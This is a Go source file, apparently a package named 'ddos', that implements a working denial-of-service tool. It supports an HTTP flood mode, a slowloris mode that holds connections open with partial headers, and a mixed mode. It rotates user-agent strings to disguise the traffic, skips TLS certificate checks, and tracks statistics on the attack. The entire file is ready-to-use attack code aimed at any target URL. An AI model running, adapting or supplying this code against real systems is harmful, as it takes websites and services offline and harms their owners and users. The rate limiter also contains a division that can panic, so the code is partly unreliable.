package ddos

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// AttackMode represents the type of DDoS attack
type AttackMode string

const (
	// ModeFlood sends maximum concurrent HTTP requests
	ModeFlood AttackMode = "flood"
	// ModeSlowloris holds connections open with partial headers
	ModeSlowloris AttackMode = "slowloris"
	// ModeMixed combines flood and slowloris approaches
	ModeMixed AttackMode = "mixed"
)

// DDoSConfig holds configuration for DDoS attack
type DDoSConfig struct {
	TargetURL        string
	Method           string
	Headers          map[string]string
	Body             string
	ContentType      string
	MaxThreads       int
	Duration         time.Duration
	Timeout          time.Duration
	AttackMode       AttackMode
	RateLimit        int // Requests per second (0 = unlimited)
	FollowRedirects  bool
	ReuseConnections bool

	// Slowloris specific
	SlowlorisDelay time.Duration // Delay between partial header sends

	// Callbacks
	OnProgress func(stats AttackStats)
}

// AttackStats holds real-time statistics
type AttackStats struct {
	RequestsSent      int64
	RequestsSuccess   int64
	RequestsFailed    int64
	BytesSent         int64
	BytesReceived     int64
	ActiveConnections int64
	AvgResponseTime   time.Duration
	ElapsedTime       time.Duration
	RequestsPerSec    float64
}

// DDoSAttack represents an active DDoS attack
type DDoSAttack struct {
	config DDoSConfig
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup

	// Atomic counters for stats
	requestsSent      int64
	requestsSuccess   int64
	requestsFailed    int64
	bytesSent         int64
	bytesReceived     int64
	activeConns       int64
	totalResponseTime int64 // in nanoseconds

	startTime time.Time
	running   bool
	mu        sync.Mutex
}

// New creates a new DDoS attack instance
func New(config DDoSConfig) *DDoSAttack {
	// Set defaults
	if config.Method == "" {
		config.Method = "GET"
	}
	if config.MaxThreads <= 0 {
		config.MaxThreads = 100
	}
	if config.Duration <= 0 {
		config.Duration = 60 * time.Second
	}
	if config.Timeout <= 0 {
		config.Timeout = 5 * time.Second
	}
	if config.AttackMode == "" {
		config.AttackMode = ModeFlood
	}
	if config.SlowlorisDelay <= 0 {
		config.SlowlorisDelay = 10 * time.Second
	}
	if config.Headers == nil {
		config.Headers = make(map[string]string)
	}

	return &DDoSAttack{
		config: config,
	}
}

// Start begins the DDoS attack
func (d *DDoSAttack) Start(ctx context.Context) error {
	d.mu.Lock()
	if d.running {
		d.mu.Unlock()
		return fmt.Errorf("attack already running")
	}
	d.running = true
	d.mu.Unlock()

	// Create cancellable context with timeout
	d.ctx, d.cancel = context.WithTimeout(ctx, d.config.Duration)
	d.startTime = time.Now()

	// Reset counters
	atomic.StoreInt64(&d.requestsSent, 0)
	atomic.StoreInt64(&d.requestsSuccess, 0)
	atomic.StoreInt64(&d.requestsFailed, 0)
	atomic.StoreInt64(&d.bytesSent, 0)
	atomic.StoreInt64(&d.bytesReceived, 0)
	atomic.StoreInt64(&d.activeConns, 0)
	atomic.StoreInt64(&d.totalResponseTime, 0)

	// Start progress reporter
	go d.reportProgress()

	// Start workers based on attack mode
	switch d.config.AttackMode {
	case ModeFlood:
		d.startFloodAttack()
	case ModeSlowloris:
		d.startSlowlorisAttack()
	case ModeMixed:
		// Split threads between flood and slowloris
		floodThreads := d.config.MaxThreads * 70 / 100
		slowThreads := d.config.MaxThreads - floodThreads
		d.startFloodWorkers(floodThreads)
		d.startSlowlorisWorkers(slowThreads)
	}

	return nil
}

// Wait waits for the attack to complete
func (d *DDoSAttack) Wait() {
	d.wg.Wait()
	d.mu.Lock()
	d.running = false
	d.mu.Unlock()
}

// Stop stops the attack gracefully
func (d *DDoSAttack) Stop() {
	if d.cancel != nil {
		d.cancel()
	}
}

// GetStats returns current attack statistics
func (d *DDoSAttack) GetStats() AttackStats {
	elapsed := time.Since(d.startTime)
	sent := atomic.LoadInt64(&d.requestsSent)
	totalRespTime := atomic.LoadInt64(&d.totalResponseTime)

	var avgRespTime time.Duration
	if sent > 0 {
		avgRespTime = time.Duration(totalRespTime / sent)
	}

	var rps float64
	if elapsed.Seconds() > 0 {
		rps = float64(sent) / elapsed.Seconds()
	}

	return AttackStats{
		RequestsSent:      sent,
		RequestsSuccess:   atomic.LoadInt64(&d.requestsSuccess),
		RequestsFailed:    atomic.LoadInt64(&d.requestsFailed),
		BytesSent:         atomic.LoadInt64(&d.bytesSent),
		BytesReceived:     atomic.LoadInt64(&d.bytesReceived),
		ActiveConnections: atomic.LoadInt64(&d.activeConns),
		AvgResponseTime:   avgRespTime,
		ElapsedTime:       elapsed,
		RequestsPerSec:    rps,
	}
}

// IsRunning returns whether the attack is currently running
func (d *DDoSAttack) IsRunning() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.running
}

// reportProgress periodically calls the progress callback
func (d *DDoSAttack) reportProgress() {
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-d.ctx.Done():
			// Final stats report
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
			return
		case <-ticker.C:
			if d.config.OnProgress != nil {
				d.config.OnProgress(d.GetStats())
			}
		}
	}
}

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	// Create HTTP client
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        numWorkers,
		MaxIdleConnsPerHost: numWorkers,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   !d.config.ReuseConnections,
		DialContext: (&net.Dialer{
			Timeout:   d.config.Timeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   d.config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if !d.config.FollowRedirects {
				return http.ErrUseLastResponse
			}
			if len(via) >= 5 {
				return fmt.Errorf("stopped after 5 redirects")
			}
			return nil
		},
	}

	// Rate limiter setup
	var rateLimiter <-chan time.Time
	if d.config.RateLimit > 0 {
		interval := time.Second / time.Duration(d.config.RateLimit/numWorkers)
		if interval < time.Millisecond {
			interval = time.Millisecond
		}
		rateLimiter = time.Tick(interval)
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.floodWorker(client, rateLimiter)
	}
}

// floodWorker is a single HTTP flood worker
func (d *DDoSAttack) floodWorker(client *http.Client, rateLimiter <-chan time.Time) {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Rate limiting
			if rateLimiter != nil {
				select {
				case <-rateLimiter:
				case <-d.ctx.Done():
					return
				}
			}

			d.sendRequest(client)
		}
	}
}

// sendRequest sends a single HTTP request
func (d *DDoSAttack) sendRequest(client *http.Client) {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	var bodyReader io.Reader
	if d.config.Body != "" {
		bodyReader = strings.NewReader(d.config.Body)
		atomic.AddInt64(&d.bytesSent, int64(len(d.config.Body)))
	}

	req, err := http.NewRequestWithContext(d.ctx, d.config.Method, d.config.TargetURL, bodyReader)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	// Set headers
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	if d.config.ContentType != "" {
		req.Header.Set("Content-Type", d.config.ContentType)
	}

	// Add custom headers
	for key, value := range d.config.Headers {
		req.Header.Set(key, value)
	}

	startTime := time.Now()
	atomic.AddInt64(&d.requestsSent, 1)

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	defer resp.Body.Close()

	// Read response body to complete the request
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024)) // Limit to 1MB
	atomic.AddInt64(&d.bytesReceived, int64(len(body)))

	responseTime := time.Since(startTime)
	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
	atomic.AddInt64(&d.requestsSuccess, 1)
}

// startSlowlorisAttack starts Slowloris attack
func (d *DDoSAttack) startSlowlorisAttack() {
	d.startSlowlorisWorkers(d.config.MaxThreads)
}

// startSlowlorisWorkers starts specified number of slowloris workers
func (d *DDoSAttack) startSlowlorisWorkers(numWorkers int) {
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.slowlorisWorker()
	}
}

// slowlorisWorker is a single Slowloris worker
func (d *DDoSAttack) slowlorisWorker() {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			d.slowlorisConnection()
		}
	}
}

// slowlorisConnection creates and maintains a single slowloris connection
func (d *DDoSAttack) slowlorisConnection() {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Parse URL to get host
	target := d.config.TargetURL
	host := target
	port := "80"
	useTLS := false

	if strings.HasPrefix(target, "https://") {
		host = strings.TrimPrefix(target, "https://")
		port = "443"
		useTLS = true
	} else if strings.HasPrefix(target, "http://") {
		host = strings.TrimPrefix(target, "http://")
	}

	// Extract host and port
	if idx := strings.Index(host, "/"); idx != -1 {
		host = host[:idx]
	}
	if idx := strings.Index(host, ":"); idx != -1 {
		port = host[idx+1:]
		host = host[:idx]
	}

	// Connect
	var conn net.Conn
	var err error

	dialer := &net.Dialer{
		Timeout: d.config.Timeout,
	}

	if useTLS {
		conn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, &tls.Config{
			InsecureSkipVerify: true,
		})
	} else {
		conn, err = dialer.Dial("tcp", host+":"+port)
	}

	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	defer conn.Close()

	atomic.AddInt64(&d.requestsSent, 1)

	// Send initial partial HTTP request
	path := "/"
	if idx := strings.Index(d.config.TargetURL, host); idx != -1 {
		remaining := d.config.TargetURL[idx+len(host):]
		if portIdx := strings.Index(remaining, ":"); portIdx == 0 {
			if slashIdx := strings.Index(remaining, "/"); slashIdx != -1 {
				path = remaining[slashIdx:]
			}
		} else if len(remaining) > 0 && remaining[0] == '/' {
			path = remaining
		}
	}

	initialHeaders := fmt.Sprintf("%s %s HTTP/1.1\r\n", d.config.Method, path)
	initialHeaders += fmt.Sprintf("Host: %s\r\n", host)
	initialHeaders += fmt.Sprintf("User-Agent: %s\r\n", getRandomUserAgent())
	initialHeaders += "Accept: */*\r\n"
	initialHeaders += "Accept-Language: en-US,en;q=0.9\r\n"

	_, err = conn.Write([]byte(initialHeaders))
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	atomic.AddInt64(&d.bytesSent, int64(len(initialHeaders)))

	// Keep connection alive by sending partial headers periodically
	ticker := time.NewTicker(d.config.SlowlorisDelay)
	defer ticker.Stop()

	headerCount := 0
	for {
		select {
		case <-d.ctx.Done():
			return
		case <-ticker.C:
			// Send a partial header to keep connection open
			partialHeader := fmt.Sprintf("X-Custom-%d: %d\r\n", headerCount, time.Now().UnixNano())
			_, err := conn.Write([]byte(partialHeader))
			if err != nil {
				// Connection closed, try again
				return
			}
			atomic.AddInt64(&d.bytesSent, int64(len(partialHeader)))
			atomic.AddInt64(&d.requestsSuccess, 1)
			headerCount++
		}
	}
}

// User agents for rotation
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
}

var userAgentIndex int64

func getRandomUserAgent() string {
	idx := atomic.AddInt64(&userAgentIndex, 1)
	return userAgents[idx%int64(len(userAgents))]
}

// FormatBytes formats bytes to human-readable string
func FormatBytes(bytes int64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// FormatDuration formats duration to human-readable string
func FormatDuration(d time.Duration) string {
	if d < time.Second {
		return fmt.Sprintf("%dms", d.Milliseconds())
	}
	if d < time.Minute {
		return fmt.Sprintf("%.1fs", d.Seconds())
	}
	return fmt.Sprintf("%dm%ds", int(d.Minutes()), int(d.Seconds())%60)
}
